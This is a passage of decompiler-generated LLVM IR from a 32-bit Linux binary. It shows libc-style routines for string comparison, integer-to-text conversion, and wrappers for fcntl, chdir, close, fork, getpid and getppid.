  br i1 %v3_80518be, label %dec_label_pc_80518ca, label %dec_label_pc_80518c3

dec_label_pc_80518c3:                             ; preds = %dec_label_pc_80518bc, %dec_label_pc_80518c3
  %v0_80518c3 = phi i32 [ %v1_80518c3, %dec_label_pc_80518c3 ], [ 0, %dec_label_pc_80518bc ]
  %v1_80518c3 = add i32 %v0_80518c3, 1
  %v2_80518c4 = add i32 %v1_80518c3, %v4_80518a8
  %v3_80518c4 = inttoptr i32 %v2_80518c4 to i8*
  %v4_80518c4 = load i8, i8* %v3_80518c4, align 1
  %v5_80518c4 = icmp eq i8 %v4_80518c4, 0
  %v1_80518c8 = icmp eq i1 %v5_80518c4, false
  br i1 %v1_80518c8, label %dec_label_pc_80518c3, label %dec_label_pc_80518ca

dec_label_pc_80518ca:                             ; preds = %dec_label_pc_80518c3, %dec_label_pc_80518bc
  %v1_80518ce = phi i32 [ 0, %dec_label_pc_80518bc ], [ %v1_80518c3, %dec_label_pc_80518c3 ]
  %v8_80518cc = icmp sgt i32 %tmp, %v1_80518ca
  br i1 %v8_80518cc, label %dec_label_pc_80518d2, label %dec_label_pc_80518ce

dec_label_pc_80518ce:                             ; preds = %dec_label_pc_80518ca
  %v7_80518d0 = icmp sgt i32 %tmp, %v1_80518ce
  br i1 %v7_80518d0, label %dec_label_pc_80518d2, label %dec_label_pc_80518d9.preheader

dec_label_pc_80518d9.preheader:                   ; preds = %dec_label_pc_80518ce
  %v10_80518da19 = icmp eq i32 %tmp, 0
  br i1 %v10_80518da19, label %dec_label_pc_80518d4, label %dec_label_pc_80518df

dec_label_pc_80518d2:                             ; preds = %dec_label_pc_80518df, %dec_label_pc_80518ce, %dec_label_pc_80518ca
  br label %dec_label_pc_80518d4

dec_label_pc_80518d4:                             ; preds = %dec_label_pc_80518d9.preheader, %dec_label_pc_80518d7, %dec_label_pc_80518d2
  %storemerge = phi i32 [ 0, %dec_label_pc_80518d2 ], [ 1, %dec_label_pc_80518d7 ], [ 1, %dec_label_pc_80518d9.preheader ]
  ret i32 %storemerge

dec_label_pc_80518d7:                             ; preds = %dec_label_pc_80518df
  %v3_80518df = zext i8 %v2_80518df to i32
  %v5_80518df = and i32 %v4_80518df21, -256
  %v6_80518df = or i32 %v3_80518df, %v5_80518df
  %v1_80518d7 = add i32 %v0_80518d722, 1
  %v1_80518d8 = add i32 %v0_80518d820, 1
  %v10_80518da = icmp eq i32 %v1_80518d923, 0
  br i1 %v10_80518da, label %dec_label_pc_80518d4, label %dec_label_pc_80518df

dec_label_pc_80518df:                             ; preds = %dec_label_pc_80518d9.preheader, %dec_label_pc_80518d7
  %v1_80518d923.in = phi i32 [ %v1_80518d923, %dec_label_pc_80518d7 ], [ %tmp, %dec_label_pc_80518d9.preheader ]
  %v0_80518d722 = phi i32 [ %v1_80518d7, %dec_label_pc_80518d7 ], [ %v4_80518a2, %dec_label_pc_80518d9.preheader ]
  %v4_80518df21 = phi i32 [ %v6_80518df, %dec_label_pc_80518d7 ], [ %v1_80518ce, %dec_label_pc_80518d9.preheader ]
  %v0_80518d820 = phi i32 [ %v1_80518d8, %dec_label_pc_80518d7 ], [ %v4_80518a8, %dec_label_pc_80518d9.preheader ]
  %v1_80518d923 = add i32 %v1_80518d923.in, -1
  %v1_80518df = inttoptr i32 %v0_80518d722 to i8*
  %v2_80518df = load i8, i8* %v1_80518df, align 1
  %v3_80518e1 = inttoptr i32 %v0_80518d820 to i8*
  %v4_80518e1 = load i8, i8* %v3_80518e1, align 1
  %v15_80518e1 = icmp eq i8 %v2_80518df, %v4_80518e1
  br i1 %v15_80518e1, label %dec_label_pc_80518d7, label %dec_label_pc_80518d2

; uselistorder directives
  uselistorder label %dec_label_pc_80518df, { 1, 0 }
  uselistorder label %dec_label_pc_80518d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80518c3, { 1, 0 }
  uselistorder label %dec_label_pc_80518b5, { 1, 0 }
}

define i32 @function_80518f0(i64 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80518f0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp25 = inttoptr i32 %arg3 to i8*
  %stack_var_-64 = alloca i32, align 4
  %v12_80518f4 = ptrtoint i32* %stack_var_-64 to i32
  %v4_80518fb = trunc i64 %arg1 to i32
  store i32 %v4_80518fb, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_8051903 = icmp eq i32 %arg3, 0
  br i1 %v2_8051903, label %dec_label_pc_8051970, label %dec_label_pc_8051907

dec_label_pc_8051907:                             ; preds = %dec_label_pc_80518f0
  %v2_8051907 = icmp eq i32 %v4_80518fb, 0
  %v3_8051907 = icmp slt i32 %v4_80518fb, 0
  br i1 %v2_8051907, label %dec_label_pc_8051980, label %dec_label_pc_805190b

dec_label_pc_805190b:                             ; preds = %dec_label_pc_8051907
  %v9_8051910 = icmp eq i32 %arg2, 10
  br i1 %v9_8051910, label %dec_label_pc_805199d, label %dec_label_pc_8051919

dec_label_pc_8051919:                             ; preds = %dec_label_pc_805199d, %dec_label_pc_805190b
  br label %dec_label_pc_805191d

dec_label_pc_805191d:                             ; preds = %dec_label_pc_80519a5, %dec_label_pc_8051919
  %storemerge35 = phi i32 [ %v4_80518fb, %dec_label_pc_8051919 ], [ %v1_80519a7, %dec_label_pc_80519a5 ]
  %v0_80519245 = phi i32 [ %v4_80518fb, %dec_label_pc_8051919 ], [ %v1_80519a7, %dec_label_pc_80519a5 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_8051919 ], [ 1, %dec_label_pc_80519a5 ]
  store i32 %storemerge35, i32* %ecx.global-to-local, align 4
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  store i32 32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051922

dec_label_pc_8051922:                             ; preds = %dec_label_pc_8051922.dec_label_pc_8051922_crit_edge, %dec_label_pc_805191d
  %v2_8051933 = phi i32 [ %v2_8051933.pre, %dec_label_pc_8051922.dec_label_pc_8051922_crit_edge ], [ %v12_80518f4, %dec_label_pc_805191d ]
  %v3_8051933 = phi i32 [ %v1_805193b, %dec_label_pc_8051922.dec_label_pc_8051922_crit_edge ], [ 32, %dec_label_pc_805191d ]
  %v0_8051926 = phi i32 [ %v0_805193c, %dec_label_pc_8051922.dec_label_pc_8051922_crit_edge ], [ %arg2, %dec_label_pc_805191d ]
  %v0_8051924 = phi i32 [ %div20, %dec_label_pc_8051922.dec_label_pc_8051922_crit_edge ], [ %v0_80519245, %dec_label_pc_805191d ]
  %tmp32 = urem i32 %v0_8051924, %v0_8051926
  %v7_805192e = icmp sgt i32 %tmp32, 9
  %v1_8051930.v1_805192b.v = select i1 %v7_805192e, i32 55, i32 48
  %v1_8051930.v1_805192b = add i32 %v1_8051930.v1_805192b.v, %tmp32
  %v1_8051933 = trunc i32 %v1_8051930.v1_805192b to i8
  %v4_8051933 = add i32 %v3_8051933, 14
  %v5_8051933 = add i32 %v4_8051933, %v2_8051933
  %v6_8051933 = inttoptr i32 %v5_8051933 to i8*
  store i8 %v1_8051933, i8* %v6_8051933, align 1
  %v0_8051939 = load i32, i32* %ecx.global-to-local, align 4
  %v0_805193b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805193b = add i32 %v0_805193b, -1
  store i32 %v1_805193b, i32* %ebx.global-to-local, align 4
  %v0_805193c = load i32, i32* %esi.global-to-local, align 4
  %div20 = udiv i32 %v0_8051939, %v0_805193c
  store i32 %div20, i32* %eax.global-to-local, align 4
  %tmp33 = urem i32 %v0_8051939, %v0_805193c
  store i32 %tmp33, i32* %edx.global-to-local, align 4
  store i32 %div20, i32* %ecx.global-to-local, align 4
  %v1_8051940 = icmp ugt i32 %v0_805193c, %v0_8051939
  %v1_8051942 = icmp eq i1 %v1_8051940, false
  br i1 %v1_8051942, label %dec_label_pc_8051922.dec_label_pc_8051922_crit_edge, label %dec_label_pc_8051944

dec_label_pc_8051922.dec_label_pc_8051922_crit_edge: ; preds = %dec_label_pc_8051922
  %v2_8051933.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051922

dec_label_pc_8051944:                             ; preds = %dec_label_pc_8051922
  %v0_8051944 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051944 = icmp eq i32 %v0_8051944, 0
  %v1_8051946 = icmp eq i1 %v1_8051944, false
  br i1 %v1_8051946, label %dec_label_pc_8051996, label %dec_label_pc_8051948

dec_label_pc_8051948:                             ; preds = %dec_label_pc_8051944
  store i32 %v0_805193b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051949

dec_label_pc_8051949:                             ; preds = %dec_label_pc_8051996, %dec_label_pc_8051948
  %v1_8051949 = phi i32 [ %v1_8051949.pre, %dec_label_pc_8051996 ], [ %v0_805193b, %dec_label_pc_8051948 ]
  %v0_8051949 = load i32, i32* @esp, align 4
  %v2_8051949 = add i32 %v1_8051949, 14
  %v3_8051949 = add i32 %v2_8051949, %v0_8051949
  store i32 %v3_8051949, i32* %eax.global-to-local, align 4
  %v1_805194d = inttoptr i32 %v3_8051949 to i8*
  %v2_805194d = load i8, i8* %v1_805194d, align 1
  %v3_805194d = icmp eq i8 %v2_805194d, 0
  br i1 %v3_805194d, label %dec_label_pc_80519b5, label %dec_label_pc_8051952

dec_label_pc_8051952:                             ; preds = %dec_label_pc_8051949
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051954

dec_label_pc_8051954:                             ; preds = %dec_label_pc_8051954, %dec_label_pc_8051952
  %v0_8051954 = phi i32 [ %v1_8051954, %dec_label_pc_8051954 ], [ 0, %dec_label_pc_8051952 ]
  %v1_8051954 = add i32 %v0_8051954, 1
  store i32 %v1_8051954, i32* %ecx.global-to-local, align 4
  %v2_8051955 = add i32 %v1_8051954, %v3_8051949
  %v3_8051955 = inttoptr i32 %v2_8051955 to i8*
  %v4_8051955 = load i8, i8* %v3_8051955, align 1
  %v5_8051955 = icmp eq i8 %v4_8051955, 0
  %v1_8051959 = icmp eq i1 %v5_8051955, false
  br i1 %v1_8051959, label %dec_label_pc_8051954, label %dec_label_pc_805195b

dec_label_pc_805195b:                             ; preds = %dec_label_pc_8051954
  %v10_805195b = icmp eq i32 %v0_8051954, -2
  br i1 %v10_805195b, label %dec_label_pc_8051970, label %dec_label_pc_8051960

dec_label_pc_8051960:                             ; preds = %dec_label_pc_805195b
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_8051949, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051964

dec_label_pc_8051964:                             ; preds = %dec_label_pc_80519b5, %dec_label_pc_8051960, %dec_label_pc_8051964.dec_label_pc_8051964_crit_edge
  %v2_8051967 = phi i32 [ %v1_805196a, %dec_label_pc_8051964.dec_label_pc_8051964_crit_edge ], [ %arg3, %dec_label_pc_8051960 ], [ %arg3, %dec_label_pc_80519b5 ]
  %v0_8051966 = phi i32 [ %v0_805196b, %dec_label_pc_8051964.dec_label_pc_8051964_crit_edge ], [ %v1_8051954, %dec_label_pc_8051960 ], [ 0, %dec_label_pc_80519b5 ]
  %v4_8051964 = phi i32 [ %v4_8051964.pre, %dec_label_pc_8051964.dec_label_pc_8051964_crit_edge ], [ %v3_8051949, %dec_label_pc_8051960 ], [ %v3_8051949, %dec_label_pc_80519b5 ]
  %v0_8051964 = phi i32 [ %v1_8051969, %dec_label_pc_8051964.dec_label_pc_8051964_crit_edge ], [ %v3_8051949, %dec_label_pc_8051960 ], [ %v3_8051949, %dec_label_pc_80519b5 ]
  %v1_8051964 = inttoptr i32 %v0_8051964 to i8*
  %v2_8051964 = load i8, i8* %v1_8051964, align 1
  %v3_8051964 = zext i8 %v2_8051964 to i32
  %v5_8051964 = and i32 %v4_8051964, -256
  %v6_8051964 = or i32 %v3_8051964, %v5_8051964
  store i32 %v6_8051964, i32* %eax.global-to-local, align 4
  %v1_8051966 = add i32 %v0_8051966, -1
  store i32 %v1_8051966, i32* %ecx.global-to-local, align 4
  %v3_8051967 = inttoptr i32 %v2_8051967 to i8*
  store i8 %v2_8051964, i8* %v3_8051967, align 1
  %v0_8051969 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051969 = add i32 %v0_8051969, 1
  store i32 %v1_8051969, i32* %edx.global-to-local, align 4
  %v0_805196a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805196a = add i32 %v0_805196a, 1
  store i32 %v1_805196a, i32* %ebx.global-to-local, align 4
  %v0_805196b = load i32, i32* %ecx.global-to-local, align 4
  %v10_805196b = icmp eq i32 %v0_805196b, -1
  %v1_805196e = icmp eq i1 %v10_805196b, false
  br i1 %v1_805196e, label %dec_label_pc_8051964.dec_label_pc_8051964_crit_edge, label %dec_label_pc_8051970.loopexit

dec_label_pc_8051964.dec_label_pc_8051964_crit_edge: ; preds = %dec_label_pc_8051964
  %v4_8051964.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051964

dec_label_pc_8051970.loopexit:                    ; preds = %dec_label_pc_8051964
  br label %dec_label_pc_8051970

dec_label_pc_8051970:                             ; preds = %dec_label_pc_8051970.loopexit, %dec_label_pc_805195b, %dec_label_pc_80518f0
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8051980:                             ; preds = %dec_label_pc_8051907
  store i8 48, i8* %tmp25, align 1
  %v2_8051983 = add i32 %arg3, 1
  %v3_8051983 = inttoptr i32 %v2_8051983 to i8*
  store i8 0, i8* %v3_8051983, align 1
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8051996:                             ; preds = %dec_label_pc_8051944
  %v0_8051996 = load i32, i32* @esp, align 4
  %v2_8051996 = add i32 %v0_805193b, 13
  %v3_8051996 = add i32 %v2_8051996, %v0_8051996
  %v4_8051996 = inttoptr i32 %v3_8051996 to i8*
  store i8 45, i8* %v4_8051996, align 1
  %v1_8051949.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051949

dec_label_pc_805199d:                             ; preds = %dec_label_pc_805190b
  %v1_805199f = icmp eq i1 %v3_8051907, false
  br i1 %v1_805199f, label %dec_label_pc_8051919, label %dec_label_pc_80519a5

dec_label_pc_80519a5:                             ; preds = %dec_label_pc_805199d
  %v1_80519a7 = sub i32 0, %v4_80518fb
  br label %dec_label_pc_805191d

dec_label_pc_80519b5:                             ; preds = %dec_label_pc_8051949
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_8051949, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051964

; uselistorder directives
  uselistorder i32 %v1_805196a, { 1, 0 }
  uselistorder i32 %v1_8051969, { 1, 0 }
  uselistorder i32 %v1_8051954, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8051949, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder i32 %div20, { 1, 2, 0 }
  uselistorder i32 %v1_805193b, { 1, 0 }
  uselistorder i32 %v4_80518fb, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg3, { 5, 2, 3, 4, 6, 7, 0, 1, 8, 9, 10 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051964, { 0, 2, 1 }
}

define i32 @function_80519bd(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80519bd:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80519bd = load i32, i32* @edi, align 4
  %v0_80519be = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80519d2 = add i32 %arg2, -12
  %v6_80519dc = icmp ugt i32 %v1_80519d2, 2
  br i1 %v6_80519dc, label %dec_label_pc_80519ec, label %dec_label_pc_80519de

dec_label_pc_80519de:                             ; preds = %dec_label_pc_80519bd
  %v4_80519e2 = call i32 @function_8051a14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_80519d2)
  br label %dec_label_pc_8051a0e

dec_label_pc_80519ec:                             ; preds = %dec_label_pc_80519bd
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80519f4 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_80519f4, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_80519f4, -4095
  br i1 %tmp17, label %dec_label_pc_8051a0c, label %dec_label_pc_8051a00

dec_label_pc_8051a00:                             ; preds = %dec_label_pc_80519ec
  %v1_8051a00 = call i32 @function_8051fb9(i32 %v0_80519be)
  %v0_8051a05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a05 = sub i32 0, %v0_8051a05
  %v2_8051a07 = inttoptr i32 %v1_8051a00 to i32*
  store i32 %v1_8051a05, i32* %v2_8051a07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a0c

dec_label_pc_8051a0c:                             ; preds = %dec_label_pc_80519ec, %dec_label_pc_8051a00
  %v0_8051a0c = phi i32 [ %v2_80519f4, %dec_label_pc_80519ec ], [ -1, %dec_label_pc_8051a00 ]
  br label %dec_label_pc_8051a0e

dec_label_pc_8051a0e:                             ; preds = %dec_label_pc_80519de, %dec_label_pc_8051a0c
  %v0_8051a13 = phi i32 [ %v4_80519e2, %dec_label_pc_80519de ], [ %v0_8051a0c, %dec_label_pc_8051a0c ]
  store i32 %v0_80519be, i32* @ebx, align 4
  store i32 %v0_80519bd, i32* @edi, align 4
  ret i32 %v0_8051a13

; uselistorder directives
  uselistorder i32 %v2_80519f4, { 1, 0, 2 }
  uselistorder i32 %v0_80519be, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051a0e, { 1, 0 }
  uselistorder label %dec_label_pc_8051a0c, { 1, 0 }
}

define i32 @function_8051a14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051a14:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a14 = load i32, i32* @edi, align 4
  store i32 %v0_8051a14, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051a2c = load i32, i32* @ebx, align 4
  %v1_8051a34 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8051a34, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8051a34, -4095
  br i1 %tmp12, label %dec_label_pc_8051a4c, label %dec_label_pc_8051a40

dec_label_pc_8051a40:                             ; preds = %dec_label_pc_8051a14
  %v1_8051a40 = call i32 @function_8051fb9(i32 %v0_8051a2c)
  %v0_8051a45 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051a45 = sub i32 0, %v0_8051a45
  %v2_8051a47 = inttoptr i32 %v1_8051a40 to i32*
  store i32 %v1_8051a45, i32* %v2_8051a47, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051a51.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051a4c

dec_label_pc_8051a4c:                             ; preds = %dec_label_pc_8051a14, %dec_label_pc_8051a40
  %v2_8051a51 = phi i32 [ %v0_8051a14, %dec_label_pc_8051a14 ], [ %v2_8051a51.pre, %dec_label_pc_8051a40 ]
  %v0_8051a4c = phi i32 [ %v1_8051a34, %dec_label_pc_8051a14 ], [ -1, %dec_label_pc_8051a40 ]
  store i32 %v2_8051a51, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051a4c

; uselistorder directives
  uselistorder i32 %v1_8051a34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051a4c, { 1, 0 }
}

define i32 @function_8051a53(i8* %arg1) local_unnamed_addr {
dec_label_pc_8051a53:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a53 = load i32, i32* @edi, align 4
  store i32 %v0_8051a53, i32* %stack_var_-4, align 4
  %v4_8051a57 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051a57, i32* %edi.global-to-local, align 4
  %v0_8051a5b = load i32, i32* @ebx, align 4
  %v3_8051a63 = call i32 @chdir(i8* %arg1)
  store i32 %v3_8051a63, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8051a63, -4095
  br i1 %tmp9, label %dec_label_pc_8051a7b, label %dec_label_pc_8051a6f

dec_label_pc_8051a6f:                             ; preds = %dec_label_pc_8051a53
  %v1_8051a6f = call i32 @function_8051fb9(i32 %v0_8051a5b)
  %v0_8051a74 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051a74 = sub i32 0, %v0_8051a74
  %v2_8051a76 = inttoptr i32 %v1_8051a6f to i32*
  store i32 %v1_8051a74, i32* %v2_8051a76, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051a7f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051a7b

dec_label_pc_8051a7b:                             ; preds = %dec_label_pc_8051a53, %dec_label_pc_8051a6f
  %v2_8051a7f = phi i32 [ %v0_8051a53, %dec_label_pc_8051a53 ], [ %v2_8051a7f.pre, %dec_label_pc_8051a6f ]
  %v0_8051a7b = phi i32 [ %v3_8051a63, %dec_label_pc_8051a53 ], [ -1, %dec_label_pc_8051a6f ]
  store i32 %v2_8051a7f, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051a7b

; uselistorder directives
  uselistorder i32 %v3_8051a63, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051a7b, { 1, 0 }
}

define i32 @function_8051a81(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051a81:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a81 = load i32, i32* @edi, align 4
  store i32 %v0_8051a81, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051a89 = load i32, i32* @ebx, align 4
  %v1_8051a91 = call i32 @close(i32 %arg1)
  store i32 %v0_8051a89, i32* @ebx, align 4
  store i32 %v1_8051a91, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8051a91, -4095
  br i1 %tmp9, label %dec_label_pc_8051aa9, label %dec_label_pc_8051a9d

dec_label_pc_8051a9d:                             ; preds = %dec_label_pc_8051a81
  %v1_8051a9d = call i32 @function_8051fb9(i32 %v0_8051a89)
  %v0_8051aa2 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051aa2 = sub i32 0, %v0_8051aa2
  %v2_8051aa4 = inttoptr i32 %v1_8051a9d to i32*
  store i32 %v1_8051aa2, i32* %v2_8051aa4, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051aad.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051aa9

dec_label_pc_8051aa9:                             ; preds = %dec_label_pc_8051a81, %dec_label_pc_8051a9d
  %v2_8051aad = phi i32 [ %v0_8051a81, %dec_label_pc_8051a81 ], [ %v2_8051aad.pre, %dec_label_pc_8051a9d ]
  %v0_8051aa9 = phi i32 [ %v1_8051a91, %dec_label_pc_8051a81 ], [ -1, %dec_label_pc_8051a9d ]
  %v2_8051aab = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051aab, i32* @edx, align 4
  store i32 %v2_8051aad, i32* @edi, align 4
  ret i32 %v0_8051aa9

; uselistorder directives
  uselistorder i32 %v1_8051a91, { 1, 0, 2 }
  uselistorder i32 %v0_8051a89, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051aa9, { 1, 0 }
}

define i32 @function_8051aaf() local_unnamed_addr {
dec_label_pc_8051aaf:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051aaf = load i32, i32* @ebx, align 4
  store i32 %v0_8051aaf, i32* %stack_var_-4, align 4
  %v1_8051ab8 = call i32 @fork(i32 %v0_8051aaf)
  store i32 %v1_8051ab8, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051ab8, -4095
  br i1 %tmp7, label %dec_label_pc_8051acf, label %dec_label_pc_8051ac3

dec_label_pc_8051ac3:                             ; preds = %dec_label_pc_8051aaf
  %v1_8051ac3 = call i32 @function_8051fb9(i32 %v0_8051aaf)
  %v0_8051ac8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ac8 = sub i32 0, %v0_8051ac8
  %v2_8051aca = inttoptr i32 %v1_8051ac3 to i32*
  store i32 %v1_8051ac8, i32* %v2_8051aca, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051ad3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051acf

dec_label_pc_8051acf:                             ; preds = %dec_label_pc_8051aaf, %dec_label_pc_8051ac3
  %v2_8051ad3 = phi i32 [ %v0_8051aaf, %dec_label_pc_8051aaf ], [ %v2_8051ad3.pre, %dec_label_pc_8051ac3 ]
  %v0_8051acf = phi i32 [ %v1_8051ab8, %dec_label_pc_8051aaf ], [ -1, %dec_label_pc_8051ac3 ]
  store i32 %v2_8051ad3, i32* @ebx, align 4
  ret i32 %v0_8051acf

; uselistorder directives
  uselistorder i32 %v1_8051ab8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051acf, { 1, 0 }
}

define i32 @function_8051ad5() local_unnamed_addr {
dec_label_pc_8051ad5:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ad5 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ad5, i32* %stack_var_-4, align 4
  %v1_8051ade = call i32 @getpid(i32 %v0_8051ad5)
  store i32 %v1_8051ade, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051ade, -4095
  br i1 %tmp7, label %dec_label_pc_8051af5, label %dec_label_pc_8051ae9

dec_label_pc_8051ae9:                             ; preds = %dec_label_pc_8051ad5
  %v1_8051ae9 = call i32 @function_8051fb9(i32 %v0_8051ad5)
  %v0_8051aee = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051aee = sub i32 0, %v0_8051aee
  %v2_8051af0 = inttoptr i32 %v1_8051ae9 to i32*
  store i32 %v1_8051aee, i32* %v2_8051af0, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051af9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051af5

dec_label_pc_8051af5:                             ; preds = %dec_label_pc_8051ad5, %dec_label_pc_8051ae9
  %v2_8051af9 = phi i32 [ %v0_8051ad5, %dec_label_pc_8051ad5 ], [ %v2_8051af9.pre, %dec_label_pc_8051ae9 ]
  %v0_8051af5 = phi i32 [ %v1_8051ade, %dec_label_pc_8051ad5 ], [ -1, %dec_label_pc_8051ae9 ]
  %v2_8051af7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051af7, i32* @edx, align 4
  store i32 %v2_8051af9, i32* @ebx, align 4
  ret i32 %v0_8051af5

; uselistorder directives
  uselistorder i32 %v1_8051ade, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051af5, { 1, 0 }
}

define i32 @function_8051afb() local_unnamed_addr {
dec_label_pc_8051afb:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051afb = load i32, i32* @ebx, align 4
  store i32 %v0_8051afb, i32* %stack_var_-4, align 4
  %v1_8051b04 = call i32 @getppid(i32 %v0_8051afb)
  store i32 %v1_8051b04, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051b04, -4095
  br i1 %tmp7, label %dec_label_pc_8051b1b, label %dec_label_pc_8051b0f

dec_label_pc_8051b0f:                             ; preds = %dec_label_pc_8051afb
  %v1_8051b0f = call i32 @function_8051fb9(i32 %v0_8051afb)
  %v0_8051b14 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b14 = sub i32 0, %v0_8051b14
  %v2_8051b16 = inttoptr i32 %v1_8051b0f to i32*
  store i32 %v1_8051b14, i32* %v2_8051b16, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051b1f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051b1b

dec_label_pc_8051b1b:                             ; preds = %dec_label_pc_8051afb, %dec_label_pc_8051b0f
  %v2_8051b1f = phi i32 [ %v0_8051afb, %dec_label_pc_8051afb ], [ %v2_8051b1f.pre, %dec_label_pc_8051b0f ]
  %v0_8051b1b = phi i32 [ %v1_8051b04, %dec_label_pc_8051afb ], [ -1, %dec_label_pc_8051b0f ]
  %v2_8051b1d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b1d, i32* @edx, align 4
  store i32 %v2_8051b1f, i32* @ebx, align 4
  ret i32 %v0_8051b1b

; uselistorder directives
  uselistorder i32 %v1_8051b04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051b1b, { 1, 0 }
}

define i32 @function_8051b21(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051b21:
